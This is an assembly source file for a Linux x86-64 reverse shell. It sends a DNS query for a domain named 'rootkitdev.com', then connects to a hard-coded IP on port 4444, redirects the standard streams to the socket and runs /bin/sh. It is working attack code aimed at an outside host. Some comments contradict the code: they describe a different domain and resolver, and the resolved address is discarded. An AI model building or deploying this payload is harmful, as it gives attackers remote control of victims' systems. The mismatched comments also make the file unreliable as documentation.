

;Author : Krash

section     .text
global      main   ;must be declared for linker (ld)

; Special thanks to James Routley For disecting the DNS protocol. 
; https://routley.io/tech/2017/12/28/hand-writing-dns-messages.html
; Special Thanks to Linux Trovalds for the SysCall map Needed for Syscall documentation . 
; https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl
; Useful for looking at HEX IP addresses. 
; https://ncalculators.com/digital-computation/ip-address-hex-decimal-binary.htm
; Useful for converting hex to ASCII 
; https://www.rapidtables.com/convert/number/hex-to-ascii.html
; Thanks to  GOUTHAM MADHWARAJ for the reverse shell example. 
; https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/



; SOCKETCALL PARAMS You can pass a value to EBX to utilize one of these functions. 

; #define SYS_SOCKET      1               /* sys_socket(2)                */
; #define SYS_BIND        2               /* sys_bind(2)                  */
; #define SYS_CONNECT     3               /* sys_connect(2)               */
; #define SYS_LISTEN      4               /* sys_listen(2)                */
; #define SYS_ACCEPT      5               /* sys_accept(2)                */
; #define SYS_GETSOCKNAME 6               /* sys_getsockname(2)           */
; #define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
; #define SYS_SOCKETPAIR  8               /* sys_socketpair(2)            */
; #define SYS_SEND        9               /* sys_send(2)                  */
; #define SYS_RECV        10              /* sys_recv(2)                  */
; #define SYS_SENDTO      11              /* sys_sendto(2)                */
; #define SYS_RECVFROM    12              /* sys_recvfrom(2)              */
; #define SYS_SHUTDOWN    13              /* sys_shutdown(2)              */
; #define SYS_SETSOCKOPT  14              /* sys_setsockopt(2)            */
; #define SYS_GETSOCKOPT  15              /* sys_getsockopt(2)            */
; #define SYS_SENDMSG     16              /* sys_sendmsg(2)               */
; #define SYS_RECVMSG     17              /* sys_recvmsg(2)               */
; #define SYS_ACCEPT4     18              /* sys_accept4(2)               */
; #define SYS_RECVMMSG    19              /* sys_recvmmsg(2)              */
; #define SYS_SENDMMSG    20              /* sys_sendmmsg(2)              */


;The Message We want to send.
;AA AA 01 00 00 01 00 00 00 00 00 00 0A 72 6f 6f 74 6b 69 74 64 65 76 03 63 6f 6d 00 00 01 00 01


   ;DNS HEADER;
   ; AA AA - ID
   ; 01 00 - Query parameters
   ; 00 01 - Number of questions
   ; 00 00 - Number of answers
   ; 00 00 - Number of authority records
   ; 00 00 - Number of additional records
   ; DNS QUESTION --
   ; 07 - 'example' has length 7, ;so change this to be the length of domain ; keep in mind there are not '.' in the question.
   ; 65 - e
   ; 78 - x
   ; 61 - a
   ; 6D - m
   ; 70 - p
   ; 6C - l
   ; 65 - e

   ; 03 - subdomain '.com'  length 03  ; change this to be the length of type.

   ; 63 - c
   ; 6F - o
   ; 6D - m

   ; 00    - zero byte to end the QNAME 
   ; 00 01 - QTYPE 
   ; 00 01 - QCLASS

   ; DNS ANSWER!
   ; aa aa
   ; 81 80
   ; 00 01
   ; 00 01
   ; 00 00
   ; 00 00
   ; 07 65
   ; 78 61
   ; 6d 70
   ; 6c 65
   ; 03 63
   ; 6f 6d
   ; 00 00
   ; 01 00
   ; 01 c0
   ; 0c 00
   ; 01 00
   ; 01 00
   ; 00 12
   ; 8d 00
   ; 04 

   ; IP ADDRESS IN HEX -- 93.184.216.34
   ; 5d
   ; b8 
   ; d8
   ; 22



main:

        mov rax, 41                                ;Create Socket
        mov rdi, 2                                 ;AF_INET
        mov rsi, 2                                 ;Sock_DGRAM
        mov rdx, 0                                 ;flags
        syscall                                    ;CALL SYSCALL CREATE SOCKET ; Looks good!

        mov rdi, rax                            ; sockfd
; ####################### DNS REQUEST

            mov rax, 0x0000000000000000
push rax 
mov rax, 0x01000100006d6f63
push rax 
mov rax, 0x0376656474696b74
push rax 
mov rax, 0x6f6f720a00000000
push rax 
mov rax, 0x000001000001AAAA
push rax 

; ############################### 

        mov rsi ,rsp
        mov rdx, 32 ; len of bytes    ; Google IP  port 53  INET Family       
        mov rax, 0x0101010135000002   ; 8.8.8.8.8 - 0x35 - 00 00 02 
        push rax
        mov rax, 44                             ; Send Syscall
      
        mov r8, rsp
        mov r9, 16
        syscall


; Now need to read the response!

        xor rax, rax   ; read syscall == 0x00
        push 100        ; Set out bytes to response to be higher!
        pop rdx         ; rdx = input size
        sub rsp, rdx
        mov rsi, rsp    ; rsi => buffer
        syscall

        add rsp, rax ; This will give us the top of the stack where the answer is stored.
        sub rsp, 0x4 ;
        mov rax, [rsp]
        mov ebx, eax 
        mov rax, rbx




    ; Set up for TCP Session    

;         ;7F 00 00 01
        mov rax,  0xbf6d24b0
        ;mov rax, 0x0100007F                   ; UNCOMENT FOR TESTING! ; Push IP 127.0.0.1
        push rax                                ; Push our saved IP!
        push word 0x5c11                        ; Port (4444)
        push word 2                             ; Address family -


        push 42                                 ; connect syscall
        push byte 16                            ; length
        push byte 41                            ; socket syscall
        push byte 1                             ; type - SOCK_STREAM (0x1)
        push byte 2                             ; family - AF_INET (0x2)

        pop rdi                                 ; family
        pop rsi                                 ; type
        xor rdx, rdx                            ; protocol
        pop rax                                 ; socket syscall
        syscall

        mov rdi, rax                            ; sockfd
        pop rdx                                 ; length
        pop rax                                 ; connect syscall
        mov rsi, rsp                            ; sockaddr
        syscall

        xor rsi, rsi
loop:
        mov al, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle loop

        xor rax, rax
        mov rdi, 0x68732f6e69622f2f
        xor rsi, rsi
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59
        syscall



